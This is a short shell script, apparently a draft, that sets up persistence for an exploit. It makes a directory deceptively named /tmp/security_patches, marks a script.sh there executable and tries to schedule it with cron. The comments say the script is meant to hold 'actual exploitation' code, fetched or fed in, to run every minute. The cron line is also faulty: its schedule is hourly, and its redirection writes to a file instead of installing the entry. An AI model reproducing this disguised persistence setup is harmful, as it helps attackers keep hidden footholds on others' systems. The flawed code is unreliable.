#! /bin/sh

mkdir /tmp/security_patches > /dev/null
cd /tmp/security_patches

# either fetch the script of actual exploitation from somewhere or feed it in here ig maybe?

# and then have a cronjob running it every minute

chmod +x /tmp/security_patches/script.sh
(crontab -l ; echo "01 * * * * /tmp/security_patches/script.sh" ) >> crontab -
